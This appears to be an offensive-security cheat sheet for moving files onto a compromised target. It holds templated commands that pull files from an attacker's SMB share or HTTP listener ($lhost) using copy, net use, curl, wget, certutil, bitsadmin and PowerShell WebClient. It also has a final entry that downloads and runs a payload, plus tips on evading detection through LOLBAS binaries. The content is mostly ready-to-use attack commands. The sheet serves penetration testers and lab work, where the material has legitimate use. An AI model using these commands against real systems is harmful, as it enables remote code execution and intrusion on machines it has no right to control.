# File_download

## File download SMB

### SMB copy no creds

Pull a file from your attacker SMB share via `copy`. Works against an open/anonymous impacket smbserver, no creds required.

```sh title:"copy from anonymous SMB share, no creds required"
copy '\\\$lhost\\$share\\$file'
```
<!-- cheat
import passwords
import users
import tun_ip
var share
var file
-->

### SMB copy with creds

Same `copy` exfil flow but authenticated; use when your smbserver is started with dummy creds (`smbserver.py -username x -password y`).

```sh title:"copy from authenticated SMB share with user/pass"
copy '\\\$lhost\\$share\\$file' /user:$user $pass
```
<!-- cheat
import passwords
import users
import tun_ip
var share
var file
-->

### Net use mount no creds

Mount your attacker share to a drive letter, then copy from it. Better for multiple file pulls than per-file `copy`.

```sh title:"Mount anonymous SMB share to drive letter for pulls"
net use n: '\\\$lhost\\$share' # then: copy n:\file.txt
```
<!-- cheat
import passwords
import users
import tun_ip
var share
-->

### Net use mount with creds

Authenticated mount of your attacker share to a drive letter; needed when the smbserver requires creds.

```sh title:"Mount authenticated SMB share to drive letter"
net use n: '\\\$lhost\\$share' /user:$user $pass # then: copy n:\file.txt
```
<!-- cheat
import passwords
import users
import tun_ip
var share
-->

## File download Web

### Curl download

Pull a file from your HTTP listener. Most reliable on Linux targets and modern Windows with curl.exe (1803+).

```sh title:"curl pull from attacker HTTP listener to disk"
curl $scheme://$lhost:$lport/$file -o $file
```
<!-- cheat
import webserver
import passwords
import users
import tun_ip
import ffuf
import files
import lports
var scheme
-->

### wget download

Same idea with wget for Linux targets that don't have curl.

```sh title:"wget pull from attacker HTTP listener"
wget $scheme://$lhost:$lport/$file
```
<!-- cheat
import webserver
import passwords
import users
import tun_ip
import ffuf
import files
import lports
var scheme
-->

### CertUtil download (small)

LOLBAS download via certutil URL cache; fine for small files. Old AVs flagged this so it's noisier than curl.

```sh title:"certutil -urlcache pull, fine for small files"
certutil -urlcache -f $scheme://$lhost:$lport/$file $upload_location_template$file
```
<!-- cheat
import webserver
import passwords
import users
import tun_ip
import ffuf
import files
var scheme
var port
var upload_location_template
-->

### CertUtil download (large)

certutil with `-split`; required for files large enough that the URL cache mode chokes.

```sh title:"certutil -urlcache -split for larger files"
certutil -urlcache -split -f $scheme://$lhost:$lport/$file $upload_location_template$file
```
<!-- cheat
import webserver
import passwords
import users
import tun_ip
import ffuf
import files
var scheme
var port
var upload_location_template
-->

### BitsAdmin download

LOLBAS download via the BITS service. Survives flaky links, runs as the BITS service so process tree looks more legit than certutil.

```sh title:"bitsadmin transfer, resilient over flaky links"
bitsadmin /transfer job $scheme://$lhost:$lport/$file $upload_location_template$file
```
<!-- cheat
import webserver
import passwords
import users
import tun_ip
import ffuf
import files
var scheme
var port
var upload_location_template
-->

### CertUtil verifyctl download

Alternate certutil download mode using `-verifyctl`.

```cmd title:"certutil -verifyctl download alternate mode"
certutil.exe -verifyctl -f -split "$scheme://$lhost:$lport/$file" "$upload_location_template$file"
```
<!-- cheat
import webserver
import passwords
import users
import tun_ip
import files
var scheme
var port
var upload_location_template
-->

### CertUtil decode base64

Decode a base64 file with certutil.

```cmd title:"Decode base64 file with certutil"
certutil.exe -decode "$encoded_file" "$output_file"
```
<!-- cheat
var encoded_file := enc.txt
var output_file
-->

### PowerShell download

Download a file with PowerShell WebClient.

```powershell title:"Download file with PowerShell WebClient"
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "(New-Object System.Net.WebClient).DownloadFile('$scheme://$lhost:$lport/$file', '$upload_location_template$file')"
```
<!-- cheat
import webserver
import passwords
import users
import tun_ip
import files
import lports
var scheme
var upload_location_template
-->

### PowerShell download and execute

Download a payload and execute it with PowerShell.

```powershell title:"Download payload and execute with PowerShell"
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "(New-Object System.Net.WebClient).DownloadFile('$url', '$output_file'); Start-Process '$output_file'"
```
<!-- cheat
var url
var output_file
-->
